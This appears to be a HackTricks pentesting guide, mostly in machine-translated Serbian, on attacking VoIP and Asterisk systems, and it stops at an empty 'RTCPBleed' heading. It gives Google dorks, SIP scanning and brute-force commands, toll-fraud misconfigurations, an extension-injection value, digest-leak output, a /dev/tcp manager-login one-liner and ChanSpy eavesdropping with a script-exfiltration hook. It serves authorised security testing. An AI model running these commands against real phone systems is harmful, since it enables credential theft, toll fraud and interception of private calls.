# Pentesting VoIP

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## VoIP Osnovne Informacije

Da biste poƒçeli da uƒçite kako VoIP funkcioni≈°e, proverite:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## Osnovne Poruke
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## Response Codes

**1xx‚ÄîProvisional Responses**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xx‚Äî–£—Å–ø–µ—à–Ω–∏ –æ–¥–≥–æ–≤–æ—Ä–∏**
```
200 OK
202 Accepted
204 No Notification
```
**3xx‚ÄîOdgovori o preusmeravanju**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xx‚ÄîOdgovori o gre≈°ci klijenta**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xx‚ÄîOdgovori o gre≈°ci servera**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xx‚ÄîGlobal Failure Responses**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## VoIP Enumeration

### Telephone Numbers

Jedan od prvih koraka koje Red Tim mo≈æe uƒçiniti je da potra≈æi dostupne telefonske brojeve za kontaktiranje sa kompanijom koristeƒái OSINT alate, Google pretrage ili skeniranje web stranica.

Kada imate telefonske brojeve, mo≈æete koristiti online usluge za identifikaciju operatera:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Znajuƒái da li operater pru≈æa VoIP usluge, mo≈æete identifikovati da li kompanija koristi VoIP... ≈†tavi≈°e, moguƒáe je da kompanija nije anga≈æovala VoIP usluge, veƒá koristi PSTN kartice za povezivanje svoje VoIP PBX sa tradicionalnom telefonskom mre≈æom.

Stvari kao ≈°to su automatski odgovori sa muzikom obiƒçno ukazuju na to da se koristi VoIP.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINT informacije

Svaka druga OSINT enumeracija koja poma≈æe u identifikaciji VoIP softvera koji se koristi biƒáe korisna za Red Team.

### Mre≈æna enumeracija

* **`nmap`** mo≈æe skenirati UDP usluge, ali zbog broja UDP usluga koje se skeniraju, veoma je spor i mo≈æda neƒáe biti veoma taƒçan sa ovim vrstama usluga.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** iz SIPVicious-a (`sudo apt install sipvicious`): Pronaƒái ƒáe SIP usluge u naznaƒçenoj mre≈æi.
* `svmap` je **lako blokirati** jer koristi User-Agent `friendly-scanner`, ali mo≈æete izmeniti kod iz `/usr/share/sipvicious/sipvicious` i promeniti ga.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`SIPPTS skeniranje`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS skeniranje je veoma brz skener za SIP usluge preko UDP, TCP ili TLS. Koristi vi≈°e niti i mo≈æe skenirati velike opsege mre≈æa. Omoguƒáava lako oznaƒçavanje opsega portova, skeniranje i TCP i UDP, kori≈°ƒáenje druge metode (po defaultu ƒáe koristiti OPTIONS) i specificiranje razliƒçitog User-Agent-a (i jo≈° mnogo toga).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Extra Network Enumeration

PBX takoƒëe mo≈æe izlagati druge mre≈æne usluge kao ≈°to su:

* **69/UDP (TFTP)**: A≈æuriranja firmvera
* **80 (HTTP) / 443 (HTTPS)**: Za upravljanje ureƒëajem putem veba
* **389 (LDAP)**: Alternativa za ƒçuvanje informacija o korisnicima
* **3306 (MySQL)**: MySQL baza podataka
* **5038 (Manager)**: Omoguƒáava kori≈°ƒáenje Asteriska sa drugih platformi
* **5222 (XMPP)**: Poruke koristeƒái Jabber
* I drugi...

### Methods Enumeration

Moguƒáe je pronaƒái **koje metode su dostupne** za kori≈°ƒáenje u PBX-u koristeƒái `SIPPTS enumerate` iz [**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```
### –ê–Ω–∞–ª–∏–∑–∏—Ä–∞—ö–µ –æ–¥–≥–æ–≤–æ—Ä–∞ —Å–µ—Ä–≤–µ—Ä–∞

–í–µ–æ–º–∞ —ò–µ –≤–∞–∂–Ω–æ –∞–Ω–∞–ª–∏–∑–∏—Ä–∞—Ç–∏ –∑–∞–≥–ª–∞–≤—ô–∞ –∫–æ—ò–∞ —Å–µ—Ä–≤–µ—Ä —à–∞—ô–µ –Ω–∞–∑–∞–¥, —É –∑–∞–≤–∏—Å–Ω–æ—Å—Ç–∏ –æ–¥ —Ç–∏–ø–∞ –ø–æ—Ä—É–∫–µ –∏ –∑–∞–≥–ª–∞–≤—ô–∞ –∫–æ—ò–∞ —à–∞—ô–µ–º–æ. –°–∞ `SIPPTS send` –∏–∑ [**sippts**](https://github.com/Pepelux/sippts) –º–æ–∂–µ–º–æ —Å–ª–∞—Ç–∏ –ø–µ—Ä—Å–æ–Ω–∞–ª–∏–∑–æ–≤–∞–Ω–µ –ø–æ—Ä—É–∫–µ, –º–∞–Ω–∏–ø—É–ª–∏—à—É—õ–∏ —Å–≤–∏–º –∑–∞–≥–ª–∞–≤—ô–∏–º–∞, –∏ –∞–Ω–∞–ª–∏–∑–∏—Ä–∞—Ç–∏ –æ–¥–≥–æ–≤–æ—Ä.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
Takoƒëe je moguƒáe dobiti podatke ako server koristi websockets. Sa `SIPPTS wssend` iz [**sippts**](https://github.com/Pepelux/sippts) mo≈æemo slati personalizovane WS poruke.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Extension Enumeration

Extensions in a PBX (Private Branch Exchange) system refer to the **jedinstveni interni identifikatori dodeljeni pojedinaƒçnim** telefonskim linijama, ureƒëajima ili korisnicima unutar organizacije ili preduzeƒáa. Extensions make it possible to **efikasno usmeravaju pozive unutar organizacije**, bez potrebe za pojedinaƒçnim spoljnim brojevima telefona za svakog korisnika ili ureƒëaj.

* **`svwar`** from SIPVicious (`sudo apt install sipvicious`): `svwar` is a free SIP PBX extension line scanner. In concept it works similar to traditional wardialers by **pogaƒëanjem opsega ekstenzija ili datog spiska ekstenzija**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten identifikuje ekstenzije na SIP serveru. Sipexten mo≈æe proveriti velike mre≈æe i opsege portova.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: Takoƒëe mo≈æete enumerisati ekstenzije/korisniƒçka imena sa metasploit:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** —ò–µ Inter Asterisk Exchange –ø—Ä–æ—Ç–æ–∫–æ–ª **–±—Ä—É—Ç–µ-—Ñ–æ—Ä—Ü–µ –µ–Ω—É–º–µ—Ä–∞—Ç–æ—Ä –∫–æ—Ä–∏—Å–Ω–∏—á–∫–∏—Ö –∏–º–µ–Ω–∞**. enumIAX –º–æ–∂–µ —Ä–∞–¥–∏—Ç–∏ —É –¥–≤–∞ —Ä–∞–∑–ª–∏—á–∏—Ç–∞ —Ä–µ–∂–∏–º–∞; –°–µ–∫–≤–µ–Ω—Ü–∏—ò–∞–ª–Ω–æ –ü–æ–≥–∞—í–∞—ö–µ –ö–æ—Ä–∏—Å–Ω–∏—á–∫–æ–≥ –ò–º–µ–Ω–∞ –∏–ª–∏ –ù–∞–ø–∞–¥ –†–µ—á–Ω–∏–∫–æ–º.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## VoIP Napadi

### Brute-Force lozinke - online

Nakon ≈°to su otkrili **PBX** i neke **ekstenzije/korisniƒçka imena**, Crveni Tim mo≈æe poku≈°ati da se **autentifikuje putem `REGISTER` metode** na ekstenziji koristeƒái reƒçnik uobiƒçajenih lozinki za brute force autentifikaciju.

{% hint style="danger" %}
Imajte na umu da **korisniƒçko ime** mo≈æe biti isto kao ekstenzija, ali ova praksa mo≈æe varirati u zavisnosti od PBX sistema, njegove konfiguracije i preferencija organizacije...

Ako korisniƒçko ime nije isto kao ekstenzija, moraƒáete da **otkrijete korisniƒçko ime koje treba da brute-forcujete**.
{% endhint %}

* **`svcrack`** iz SIPVicious (`sudo apt install sipvicious`): SVCrack vam omoguƒáava da provalite lozinku za odreƒëeno korisniƒçko ime/ekstenziju na PBX-u.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrack je daljinski alat za razbijanje lozinki za SIP usluge. Rcrack mo≈æe testirati lozinke za nekoliko korisnika na razliƒçitim IP adresama i opsezima portova.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### VoIP Sniffing

Ako pronaƒëete VoIP opremu unutar **Open Wifi mre≈æe**, mogli biste **sniff-ovati sve informacije**. ≈†tavi≈°e, ako ste unutar zatvorenije mre≈æe (povezani putem Ethernet-a ili za≈°tiƒáene Wifi mre≈æe) mogli biste izvesti **MitM napade kao ≈°to su** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) izmeƒëu **PBX-a i gateway-a** kako biste sniff-ovali informacije.

Meƒëu mre≈ænim informacijama, mogli biste pronaƒái **web akreditive** za upravljanje opremom, korisniƒçke **ekstenzije**, **korisniƒçka imena**, **IP** adrese, ƒçak i **hashovane lozinke** i **RTP pakete** koje mo≈æete reprodukovati da **ƒçujete razgovor**, i jo≈° mnogo toga.

Da biste dobili ove informacije, mogli biste koristiti alate kao ≈°to su Wireshark, tcpdump... ali **posebno kreirani alat za sniff-ovanje VoIP razgovora je** [**ucsniff**](https://github.com/Seabreg/ucsniff).

{% hint style="danger" %}
Imajte na umu da ako se **TLS koristi u SIP komunikaciji** neƒáete moƒái da vidite SIP komunikaciju u ƒçistom obliku.\
Isto ƒáe se desiti ako se koristi **SRTP** i **ZRTP**, **RTP paketi neƒáe biti u ƒçistom tekstu**.
{% endhint %}

#### SIP akreditive (Brute-Force lozinke - offline)

[Pogledajte ovaj primer da bolje razumete **SIP REGISTER komunikaciju**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) da biste saznali kako se **akreditive ≈°alju**.

* **`sipdump`** & **`sipcrack`,** deo **sipcrack** (`apt-get install sipcrack`): Ovi alati mogu **izvuƒái** iz **pcap**-a **digest autentifikacije** unutar SIP protokola i **bruteforce**-ovati ih.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS dump`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dump mo≈æe da izvuƒçe digest autentifikacije iz pcap datoteke.
```bash
sippts dump -f capture.pcap -o data.txt
```
* **`SIPPTS dcrack`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrack je alat za razbijanje digest autentifikacija dobijenih sa SIPPTS dump.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tshark izvlaƒçi podatke SIP protokola iz PCAP datoteke.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### DTMF kodovi

**Ne samo SIP akreditivi** mogu se pronaƒái u mre≈ænom saobraƒáaju, takoƒëe je moguƒáe pronaƒái DTMF kodove koji se koriste, na primer, za pristup **govornoj po≈°ti**.\
Moguƒáe je poslati ove kodove u **INFO SIP porukama**, u **zvuku** ili unutar **RTP paketa**. Ako su kodovi unutar RTP paketa, mo≈æete iseƒái taj deo razgovora i koristiti alat multimo da ih ekstrahujete:
```bash
multimon -a DTMF -t wac pin.wav
```
### Besplatni pozivi / Asterisks konekcije pogre≈°ne konfiguracije

U Asterisku je moguƒáe omoguƒáiti konekciju **sa odreƒëene IP adrese** ili **sa bilo koje IP adrese**:
```
host=10.10.10.10
host=dynamic
```
Ako je IP adresa specificirana, host **neƒáe morati da ≈°alje REGISTER** zahteve s vremena na vreme (u REGISTER paketu se ≈°alje vreme trajanja, obiƒçno 30min, ≈°to znaƒçi da ƒáe u drugom scenariju telefon morati da REGISTER svakih 30min). Meƒëutim, moraƒáe da ima otvorene portove koji omoguƒáavaju veze sa VoIP serverom za primanje poziva.

Da bi se definisali korisnici, mogu se definisati kao:

* **`type=user`**: Korisnik mo≈æe primati pozive samo kao korisnik.
* **`type=friend`**: Moguƒáe je obavljati pozive kao peer i primati ih kao korisnik (koristi se sa ekstenzijama)
* **`type=peer`**: Moguƒáe je slati i primati pozive kao peer (SIP-trunks)

Takoƒëe je moguƒáe uspostaviti poverenje sa nesigurnom promenljivom:

* **`insecure=port`**: Omoguƒáava peer veze validirane IP-om.
* **`insecure=invite`**: Ne zahteva autentifikaciju za INVITE poruke
* **`insecure=port,invite`**: Oba

{% hint style="warning" %}
Kada se koristi **`type=friend`**, **vrednost** promenljive **host** **neƒáe biti kori≈°ƒáena**, tako da ako administrator **pogre≈°no konfiguri≈°e SIP-trunk** koristeƒái tu vrednost, **bilo ko ƒáe moƒái da se pove≈æe na njega**.

Na primer, ova konfiguracija bi bila ranjiva:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Besplatni pozivi / Asterisk kontekst pogre≈°nih konfiguracija

U Asterisku, **kontekst** je imenovani kontejner ili sekcija u dijal planu koja **grupi≈°e povezane ekstenzije, akcije i pravila**. Dijal plan je osnovna komponenta Asterisk sistema, jer defini≈°e **kako se upravlja i usmerava dolaznim i odlaznim pozivima**. Konteksti se koriste za organizaciju dijal plana, upravljanje kontrolom pristupa i pru≈æanje razdvajanja izmeƒëu razliƒçitih delova sistema.

Svaki kontekst je definisan u konfiguracionom fajlu, obiƒçno u **`extensions.conf`** fajlu. Konteksti su oznaƒçeni uglastim zagradama, sa imenom konteksta unutar njih. Na primer:
```bash
csharpCopy code[my_context]
```
Unutar konteksta, defini≈°ete ekstenzije (uzorke biranih brojeva) i povezujete ih sa serijom akcija ili aplikacija. Ove akcije odreƒëuju kako se poziv obraƒëuje. Na primer:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Ovaj primer demonstrira jednostavan kontekst pod nazivom "my\_context" sa ekstenzijom "100". Kada neko pozove 100, poziv ƒáe biti prihvaƒáen, biƒáe pu≈°tena poruka dobrodo≈°lice, a zatim ƒáe poziv biti prekinut.

Ovo je **drugi kontekst** koji omoguƒáava **pozivanje na bilo koji drugi broj**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Ako administrator defini≈°e **default context** kao:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
Svako ƒáe moƒái da koristi **server za pozivanje na bilo koji drugi broj** (a administrator servera ƒáe platiti za poziv).
{% endhint %}

{% hint style="danger" %}
≈†tavi≈°e, po defaultu, **`sip.conf`** datoteka sadr≈æi **`allowguest=true`**, tako da **bilo koji** napadaƒç bez **autentifikacije** ƒáe moƒái da pozove bilo koji drugi broj.
{% endhint %}

*   **`SIPPTS invite`** iz [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS invite proverava da li **PBX server dozvoljava da pravimo pozive bez autentifikacije**. Ako SIP server ima pogre≈°nu konfiguraciju, dozvoliƒáe nam da pravimo pozive na spoljne brojeve. Takoƒëe mo≈æe da nam dozvoli da prebacimo poziv na drugi spoljni broj.

Na primer, ako va≈° Asterisk server ima lo≈°u konfiguraciju konteksta, mo≈æete prihvatiti INVITE zahtev bez autorizacije. U ovom sluƒçaju, napadaƒç mo≈æe da pravi pozive ne znajuƒái nijednog korisnika/lozinku.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Besplatni pozivi / Pogre≈°no konfigurisani IVRS

IVRS oznaƒçava **Interaktivni sistem za glasovne odgovore**, telekomunikacionu tehnologiju koja omoguƒáava korisnicima da komuniciraju sa kompjuterskim sistemom putem glasovnih ili tonskih unosa. IVRS se koristi za izgradnju **automatskih sistema za upravljanje pozivima** koji nude niz funkcionalnosti, kao ≈°to su pru≈æanje informacija, usmeravanje poziva i prikupljanje korisniƒçkih unosa.

IVRS u VoIP sistemima obiƒçno se sastoji od:

1. **Glasovnih poruka**: Prethodno snimljene audio poruke koje vode korisnike kroz IVR meni opcije i uputstva.
2. **DTMF** (Dual-Tone Multi-Frequency) signalizacija: Tonski unosi generisani pritiskanjem tastera na telefonu, koji se koriste za navigaciju kroz IVR menije i pru≈æanje unosa.
3. **Usmeravanje poziva**: Usmeravanje poziva na odgovarajuƒáu destinaciju, kao ≈°to su specifiƒçna odeljenja, agenti ili ekstenzije na osnovu korisniƒçkog unosa.
4. **Prikupljanje korisniƒçkih unosa**: Prikupljanje informacija od pozivaoca, kao ≈°to su brojevi raƒçuna, ID sluƒçajeva ili bilo koji drugi relevantni podaci.
5. **Integracija sa spoljnim sistemima**: Povezivanje IVR sistema sa bazama podataka ili drugim softverskim sistemima za pristup ili a≈æuriranje informacija, izvr≈°avanje radnji ili pokretanje dogaƒëaja.

U Asterisk VoIP sistemu, mo≈æete kreirati IVR koristeƒái plan biranja (**`extensions.conf`** datoteku) i razne aplikacije kao ≈°to su `Background()`, `Playback()`, `Read()`, i druge. Ove aplikacije vam poma≈æu da reprodukujete glasovne poruke, prikupite korisniƒçke unose i kontroli≈°ete tok poziva.

#### Primer ranjive konfiguracije
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
Prethodni je primer gde se korisniku tra≈æi da **pritisne 1 za poziv** u odeljenje, **2 za poziv** u drugo, ili **potpunu internu** ako je zna.\
Ranljivost je u tome ≈°to se naznaƒçena **du≈æina interne ne proverava, tako da korisnik mo≈æe uneti 5 sekundi vremensko ograniƒçenje za ceo broj i biƒáe pozvan.**

### Umetanje interne

Kori≈°ƒáenje interne kao:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Gde **`${EXTEN}`** je **ekstenzija** koja ƒáe biti pozvana, kada se **ext 101 uvede** ovo bi se desilo:
```scss
exten => 101,1,Dial(SIP/101)
```
Meƒëutim, ako **`${EXTEN}`** omoguƒáava unos **vi≈°e od brojeva** (kao u starijim verzijama Asteriska), napadaƒç bi mogao uneti **`101&SIP123123123`** da pozove telefonski broj 123123123. I ovo bi bio rezultat:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Zato, poziv na ekstenziju **`101`** i **`123123123`** ƒáe biti poslat i samo prvi koji primi poziv ƒáe biti uspostavljen... ali ako napadaƒç koristi **ekstenziju koja zaobilazi bilo kakvo podudaranje** koje se vr≈°i, ali ne postoji, mogao bi **injektovati poziv samo na ≈æeljeni broj**.

## SIPDigestLeak ranjivost

SIP Digest Leak je ranjivost koja utiƒçe na veliki broj SIP telefona, ukljuƒçujuƒái i hardverske i softverske IP telefone, kao i telefonske adaptore (VoIP na analogne). Ranjivost omoguƒáava **curenje odgovora na Digest autentifikaciju**, koji se izraƒçunava iz lozinke. **Offline napad na lozinku je tada moguƒá** i mo≈æe povratiti veƒáinu lozinki na osnovu odgovora na izazov.

**[Scenarijo ranjivosti odavde**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. IP telefon (≈ærtva) slu≈°a na bilo kojem portu (na primer: 5060), prihvatajuƒái telefonske pozive
2. Napadaƒç ≈°alje INVITE IP telefonu
3. Telefon ≈ærtve poƒçinje da zvoni i neko podi≈æe slu≈°alicu i odmah je spu≈°ta (jer se niko ne javlja na drugom kraju)
4. Kada se telefon spusti, **telefon ≈ærtve ≈°alje BYE napadaƒçu**
5. **Napadaƒç izdaje 407 odgovor** koji **tra≈æi autentifikaciju** i postavlja izazov za autentifikaciju
6. **Telefon ≈ærtve daje odgovor na izazov za autentifikaciju** u drugom BYE
7. **Napadaƒç mo≈æe zatim da izvede brute-force napad** na odgovor na izazov na svom lokalnom raƒçunaru (ili distribuiranoj mre≈æi itd.) i pogodi lozinku

* **SIPPTS leak** iz [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS leak koristi ranjivost SIP Digest Leak koja utiƒçe na veliki broj SIP telefona. Izlaz se mo≈æe saƒçuvati u SipCrack formatu kako bi se bruteforce-ovao koristeƒái SIPPTS dcrack ili SipCrack alat.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call omoguƒáava **web korisniku** (koji, na primer, mo≈æe biti zainteresovan za proizvod) da **unesu** svoj **broj telefona** kako bi bio pozvan. Zatim ƒáe biti pozvan komercijal, a kada **podigne slu≈°alicu**, korisnik ƒáe biti **pozvan i povezan sa agentom**.

Uobiƒçajeni Asterisk profil za ovo je:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* Prethodni profil omoguƒáava **BILO KOM IP adresi da se pove≈æe** (ako je lozinka poznata).
* Da bi se **organizovao poziv**, kao ≈°to je prethodno navedeno, **nema potrebe za dozvolama za ƒçitanje** i **samo** **originate** u **pisanje** je potrebno.

Sa tim dozvolama, svaka IP adresa koja zna lozinku mo≈æe da se pove≈æe i izvuƒçe previ≈°e informacija, kao: 

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Moguƒáe je zatra≈æiti vi≈°e informacija ili akcija.**

### **Prislu≈°kivanje**

U Asterisku je moguƒáe koristiti komandu **`ChanSpy`** koja oznaƒçava **produ≈æetak(e) za praƒáenje** (ili sve njih) kako bi se ƒçule razgovore koji se odvijaju. Ova komanda treba da bude dodeljena produ≈æetku.

Na primer, **`exten => 333,1,ChanSpy('all',qb)`** oznaƒçava da ako **pozovete** **produ≈æetak 333**, on ƒáe **pratiti** **`sve`** produ≈æetke, **poƒçeti da slu≈°a** kada zapoƒçne novi razgovor (**`b`**) u tihom re≈æimu (**`q`**) jer ne ≈æelimo da se ukljuƒçujemo u njega. Mo≈æete preƒái sa jednog razgovora na drugi pritiskom na **`*`**, ili biranjem broja produ≈æetka.

Takoƒëe je moguƒáe koristiti **`ExtenSpy`** za praƒáenje samo jednog produ≈æetka.

Umesto slu≈°anja razgovora, moguƒáe je **snimati ih u fajlove** koristeƒái produ≈æetak kao: 

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

Pozivi ƒáe biti saƒçuvani u **`/tmp`**.

Takoƒëe mo≈æete ƒçak naterati Asterisk da **izvr≈°i skriptu koja ƒáe otkriti poziv** kada se zatvori.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed ranjivost

